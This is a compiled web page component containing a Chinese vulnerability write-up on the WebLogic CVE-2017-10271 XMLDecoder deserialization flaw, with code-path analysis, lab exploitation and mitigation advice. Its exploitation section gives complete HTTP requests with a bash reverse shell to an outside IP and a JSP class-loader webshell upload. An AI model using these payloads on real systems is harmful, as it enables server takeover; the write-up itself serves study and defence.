import{_ as o}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c,a,d as s,e,b as p,o as l,r}from"./app-C5cR4qpO.js";const u="/DailyNotes/assets/CVE_2017_10271_1-Z6I-dyQv.png",i="/DailyNotes/assets/CVE_2017_10271_2-BDn2ix8U.png",k="/DailyNotes/assets/CVE_2017_10271_5-JL5KkuCi.png",d="/DailyNotes/assets/03-ANIvoi9K.png",g="/DailyNotes/assets/02-D3Z9strh.png",m="/DailyNotes/assets/01-CV8qg2Tu.png",v="/DailyNotes/assets/04-CzR-2wao.png",w="/DailyNotes/assets/05-BLllSb3a.png",h={},b={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"},y={href:"https://so.csdn.net/so/search?q=%E7%94%B2%E9%AA%A8%E6%96%87&spm=1001.2101.3001.7020",target:"_blank",rel:"noopener noreferrer"},f={href:"work:WorkContext",target:"_blank",rel:"noopener noreferrer"};function q(x,n){const t=r("ExternalLinkIcon");return l(),c("div",null,[n[7]||(n[7]=a("h1",{id:"漏洞名称-weblogic-10-3-6-wls-wsat-xmldecoder-反序列化漏洞",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞名称-weblogic-10-3-6-wls-wsat-xmldecoder-反序列化漏洞"},[a("span",null,"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞")])],-1)),n[8]||(n[8]=a("hr",null,null,-1)),n[9]||(n[9]=a("h2",{id:"漏洞介绍",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞介绍"},[a("span",null,"漏洞介绍")])],-1)),a("blockquote",null,[a("p",null,[a("a",b,[n[0]||(n[0]=s("国家信息安全漏洞库 (cnnvd.org.cn)")),e(t)])])]),n[10]||(n[10]=a("hr",null,null,-1)),a("p",null,[n[2]||(n[2]=s("Oracle Fusion Middleware（Oracle融合中间件）是美国")),a("a",y,[n[1]||(n[1]=s("甲骨文")),e(t)]),n[3]||(n[3]=s("（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。"))]),n[11]||(n[11]=p(`<hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>OracleWebLogic Server10.3.6.0.0 OracleWebLogic Server12.1.3.0.0 OracleWebLogic Server12.2.1.1.0 OracleWebLogic Server12.2.1.2.0</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><p>Weblogic的WLS Security组件使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。漏洞入口点是wls-wsat.war，组件使用了weblogic自带的webservices处理程序来处理SOAP请求。通过WLSServletAdapter类进行处理，在WorkContextServerTube类中处理POST数据包中的XML数据。</p><p>分析几个重要的函数：</p><blockquote><p><em>WLSServletAdapter类中的handle( )函数：</em></p></blockquote><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ServletContext</span> var1<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> var2<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> var3<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">)</span> <span class="token operator">||</span> var2<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;HEAD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">HttpMetadataPublisher</span> var4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpMetadataPublisher</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>endpoint<span class="token punctuation">.</span><span class="token function">getSPI</span><span class="token punctuation">(</span><span class="token class-name">HttpMetadataPublisher</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var4<span class="token punctuation">.</span><span class="token function">handleMetadataRequest</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isOraWsdlMetadataQuery</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">publishWSDL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><p>进入super.handle()方法。然后跟进函数调用过程中的WorkContextServerTube类。</p><blockquote><p><em>WorkContextServerTube类中的processRequest( )函数：</em></p></blockquote><pre><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">NextAction</span> <span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">Packet</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>isUseOldFormat <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">HeaderList</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Header</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">WorkAreaConstants</span><span class="token punctuation">.</span><span class="token constant">WORK_AREA_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readHeaderOld</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>isUseOldFormat <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">Header</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">JAX_WS_WORK_AREA_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readHeader</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>`,15)),a("p",null,[n[5]||(n[5]=s("var3对象获取了")),a("a",f,[n[4]||(n[4]=s("work:WorkContext")),e(t)]),n[6]||(n[6]=s(" </work:WorkContext>标签的相关内容。"))]),n[12]||(n[12]=p(`<p>进入到readHeaderOld这个函数。</p><blockquote><p><em>WorkContextTube类中的readHeaderOld( )函数：</em></p></blockquote><pre><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">readHeaderOld</span><span class="token punctuation">(</span><span class="token class-name">Header</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">XMLStreamReader</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">readHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            var2<span class="token punctuation">.</span><span class="token function">nextTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            var2<span class="token punctuation">.</span><span class="token function">nextTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">XMLStreamReaderToXMLStreamWriter</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamReaderToXMLStreamWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ByteArrayOutputStream</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">XMLStreamWriter</span> var5 <span class="token operator">=</span> <span class="token class-name">XMLStreamWriterFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
            var3<span class="token punctuation">.</span><span class="token function">bridge</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>
            var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">WorkContextXmlInputAdapter</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkContextXmlInputAdapter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">receive</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">XMLStreamException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WebServiceException</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WebServiceException</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><p><strong>Tips：</strong></p><blockquote><p><em>ByteArrayOutputStream: 可以捕获内存缓冲区的数据，转换成字节数组</em> <em>ByteArrayInputStream: 可以将字节数组转化为输入流</em></p></blockquote><p>IDEA在调试过程中，会把执行完毕的参数值在后面显示，所以在readHeaderOld( )方法中调试的时候，可看到var4的值为：</p><pre><code class="language-xml">	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1.7.0_80<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>java.beans.XMLDecoder<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>  
	      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>new</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>java.lang.ProcessBuilder<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>  
	           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>start<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>  
	      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>new</span><span class="token punctuation">&gt;</span></span>  
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>  
</code></pre><p>其实就是POC中的XML内容。</p><p><code>var4.toByteArray()</code>：将var4的内容转为字节数组，然后传入<code>ByteArrayInputStream</code>转化为流。之后进入执行<code>receive( )</code>函数。</p><p>进入<code>WorkContextXmlInputAdapter </code>类，接收输入流，转为<code>XmlDecoder</code>对象。</p><pre><code class="language-java">	<span class="token keyword">public</span> <span class="token class-name">WorkContextXmlInputAdapter</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
	      <span class="token keyword">this</span><span class="token punctuation">.</span>xmlDecoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLDecoder</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>  
	  <span class="token punctuation">}</span>  
</code></pre><p>随后调用<code>readObject( )</code>方法进行反序列化操作，从而导致反序列化远程代码执行。</p><p>参照函数调用流程图，可知在<code>WorkContextTube</code>类的<code>readHeaderOld</code>函数的<code>receive( )</code>方法中，进行了多层调用，最终到达<code>readObject( )</code>。</p><p>跟踪<code>WorkContextEntrylmpl.class</code>类：</p><pre><code class="language-java">	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">WorkContextEntry</span> <span class="token function">readEntry</span><span class="token punctuation">(</span><span class="token class-name">WorkContextInput</span> var0<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>  
	    <span class="token class-name">String</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">WorkContextEntry</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token constant">NULL_CONTEXT</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">WorkContextEntryImpl</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
</code></pre><p>调用<code>readUTF( )</code>方法，<code>WorkContextXmlInputAdapter </code>类中的<code>readUTF( )</code>方法如下：</p><pre><code class="language-java">	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>  
	        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>xmlDecoder<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	    <span class="token punctuation">}</span>  
</code></pre><p>调用<code>readObject( )</code>方法，进行反序列化操作，造成漏洞产生，返回反序列化的字符串。</p><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><figure><img src="`+u+'" alt="CVE_2017_10271_1" tabindex="0" loading="lazy"><figcaption>CVE_2017_10271_1</figcaption></figure><figure><img src="'+i+'" alt="CVE_2017_10271_2" tabindex="0" loading="lazy"><figcaption>CVE_2017_10271_2</figcaption></figure><hr><h3 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式"><span>利用方式</span></a></h3><hr><h4 id="探测确认" tabindex="-1"><a class="header-anchor" href="#探测确认"><span>探测确认</span></a></h4><p>利用weblogicScanner(https://github.com/0xn0ne/weblogicScanner)，检查是否存在漏洞。</p><figure><img src="'+k+'" alt="CVE_2017_10271_5" tabindex="0" loading="lazy"><figcaption>CVE_2017_10271_5</figcaption></figure><hr><h4 id="利用过程" tabindex="-1"><a class="header-anchor" href="#利用过程"><span>利用过程</span></a></h4><p>使用burpsuite访问http://ip:7001/wls-wsat/CoordinatorPortType 显示如下：</p><figure><img src="'+d+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>将抓到的包修改为POST请求并加上payload</p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.1.189:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 639

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
&lt;void index=&quot;0&quot;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.182.234.169/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><figure><img src="`+g+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>成功获取shell：</p><figure><img src="'+m+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>还可以上传webshell，发送如下请求：</p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.1.189:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 1572


&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
    &lt;![CDATA[
&lt;%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
        }
    }
%&gt;
&lt;%
    String cls = request.getParameter(&quot;passwd&quot;);
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%&gt;
    ]]&gt;
    &lt;/string&gt;
    &lt;/void&gt;
    &lt;void method=&quot;close&quot;/&gt;
    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
    &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><p>上传webshell后使用蚁剑进行连接，如下：</p><figure><img src="`+v+'" alt="04" tabindex="0" loading="lazy"><figcaption>04</figcaption></figure><figure><img src="'+w+`" alt="05" tabindex="0" loading="lazy"><figcaption>05</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><ol><li>临时解决方案 根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形成防护能力后再进行恢复。</li></ol><p>根据实际环境路径，删除WebLogic wls-wsat组件：</p><pre><code>rm -f   /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
</code></pre><p>删除后重启Weblogic域控制器服务:</p><pre><code>DOMAIN_NAME/bin/stopWeblogic.sh   #停止服务
DOMAIN_NAME/bin/startManagedWebLogic.sh    #启动服务
</code></pre><p>删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。</p><p>2.官方补丁修复 前往Oracle官网下载10月份所提供的安全补丁 http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html 升级过程可参考： http://blog.csdn.net/qqlifu/article/details/49423839</p>`,53))])}const _=o(h,[["render",q],["__file","weblogic_CVE-2017-10271.html.vue"]]),S=JSON.parse(`{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2017-10271.html","title":"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞","lang":"zh-CN","frontmatter":{"description":"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracl...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2017-10271.html"}],["meta",{"property":"og:site_name","content":"echo0d'notes"}],["meta",{"property":"og:title","content":"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracl..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-11-15T10:05:31.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:modified_time","content":"2024-11-15T10:05:31.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-11-15T10:05:31.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式","slug":"利用方式","link":"#利用方式","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[]}],"git":{"createdTime":1731665131000,"updatedTime":1731665131000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":1}]},"readingTime":{"minutes":4.69,"words":1406},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2017-10271.md","localizedDate":"2024年11月15日","autoDesc":true,"excerpt":"\\n<hr>\\n<h2>漏洞介绍</h2>\\n<blockquote>\\n<p><a href=\\"http://www.cnnvd.org.cn/index.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">国家信息安全漏洞库 (cnnvd.org.cn)</a></p>\\n</blockquote>\\n<hr>\\n<p>Oracle Fusion Middleware（Oracle融合中间件）是美国<a href=\\"https://so.csdn.net/so/search?q=%E7%94%B2%E9%AA%A8%E6%96%87&amp;spm=1001.2101.3001.7020\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">甲骨文</a>（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>"}`);export{_ as comp,S as data};
